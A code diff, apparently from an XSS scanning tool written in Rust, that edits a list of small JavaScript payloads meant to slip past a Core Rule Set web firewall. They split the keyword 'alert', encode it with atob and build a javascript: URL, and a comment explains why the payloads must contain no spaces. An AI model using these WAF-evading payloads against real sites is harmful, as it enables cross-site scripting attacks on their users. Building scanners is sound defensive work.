@@ -18,12 +18,18 @@ pub(crate) const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
     "globalThis.alert(1)",           // globalThis reference
     "self['ale'+'rt'](1)",           // self + string concat
     "Reflect.apply(alert,null,[1])", // Reflect API
-    // CRS bypass: avoid common keywords alert/confirm/prompt
-    "new Function('ale'+'rt(1)')()", // Function constructor with split keyword
-    "setTimeout('ale'+'rt(1)')",     // setTimeout with string concat
-    "window[atob('YWxlcnQ=')](1)",   // atob-based keyword reconstruction
+    // CRS bypass: avoid common keywords alert/confirm/prompt.
+    // Like `>`, whitespace ends an *unquoted* attribute value, so no SMALL
+    // primitive may contain a space: `onerror=new Function(…)` parses as
+    // `onerror="new"` (a SyntaxError) plus a junk attribute, while a trailing
+    // `class=` marker still forms and the payload is reported [V] with a PoC
+    // that never runs. `Function(…)` needs no `new`, and `new(Set)(…)` is the
+    // space-free spelling of `new Set(…)`.
+    "Function('ale'+'rt(1)')()", // Function constructor with split keyword
+    "setTimeout('ale'+'rt(1)')", // setTimeout with string concat
+    "window[atob('YWxlcnQ=')](1)", // atob-based keyword reconstruction
     "location='javas'+'cript:ale'+'rt(1)'", // location assignment with split
-    "Set.prototype.has.call(new Set([alert]),alert)&&alert(1)", // Set API misdirection
+    "Set.prototype.has.call(new(Set)([alert]),alert)&&alert(1)", // Set API misdirection
 ];
 
 // for inJS
